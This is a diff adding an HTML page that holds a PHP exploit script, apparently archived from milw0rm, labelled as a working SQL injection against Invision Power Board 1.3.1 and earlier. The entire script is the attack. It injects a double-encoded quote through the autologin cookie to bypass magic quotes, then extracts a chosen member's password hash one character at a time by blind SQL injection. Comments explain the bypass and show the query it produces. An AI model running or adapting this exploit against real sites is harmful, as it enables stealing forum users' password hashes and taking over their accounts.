@@ -1,0 +1,79 @@
+<html><head><title>Invision Power Board <= 1.3.1 Login.PHP SQL Injection (working)</title></head><pre>&lt;?php
+/* 
+&lt;= 1.3.1 Final
+/str0ke
+*/
+
+$server = &quot;SERVER&quot;;
+$port = 80;
+$file = &quot;PATH&quot;;
+
+$target = 81;
+
+/* User id and password used to fake-logon are not important. '10' is a
+random number. */
+$id = 10;
+$pass = &quot;&quot;;
+
+$hex = &quot;0123456789abcdef&quot;;
+for($i = 1; $i &lt;= 32; $i++ ) {
+        $idx = 0;
+        $found = false;
+
+        while( !($found) ) {
+                $letter = substr($hex, $idx, 1);
+
+                /* %2527 translates to %27, which gets past magic quotes.
+This is translated to ' by urldecode. */
+                $cookie =
+&quot;member_id=$id;pass_hash=$pass%2527%20OR%20id=$target&quot;;
+                $cookie .=
+&quot;%20HAVING%20id=$target%20AND%20MID(`password`,$i,1)=%2527&quot; . $letter;
+
+                /* Query is in effect: SELECT * FROM ibf_members
+                                       WHERE id=$id AND password='$pass' OR
+id=$target
+                                       HAVING id=$target AND
+MID(`password`,$i,1)='$letter' */
+
+                $header = getHeader($server, $port, $file .
+&quot;index.php?act=Login&amp;CODE=autologin&quot;, $cookie);
+                if( !preg_match('/Location:(.*)act\=Login\&amp;CODE\=00\r\n/',
+$header) ) {
+                        echo $i . &quot;: &quot; . $letter . &quot;\n&quot;;
+                        $found = true;
+
+                        $hash .= $letter;
+                } else {
+                        $idx++;
+                }
+        }
+}
+
+echo &quot;\n\nFinal Hash: $hash\n&quot;;
+
+function getHeader($server, $port, $file, $cookie) {
+        $ip = gethostbyname($server);
+        $fp = fsockopen($ip, $port);
+
+        if (!$fp) {
+                return &quot;Unknown&quot;;
+        } else {
+                $com = &quot;HEAD $file HTTP/1.1\r\n&quot;;
+                $com .= &quot;Host: $server:$port\r\n&quot;;
+                $com .= &quot;Cookie: $cookie\r\n&quot;;
+                $com .= &quot;Connection: close\r\n&quot;;
+                $com .= &quot;\r\n&quot;;
+
+                fputs($fp, $com);
+
+                do {
+                        $header.= fread($fp, 512);
+                } while( !preg_match('/\r\n\r\n$/',$header) );
+        }
+
+        return $header;
+}
+?&gt;
+
+// milw0rm.com [2005-06-08]</pre></html>
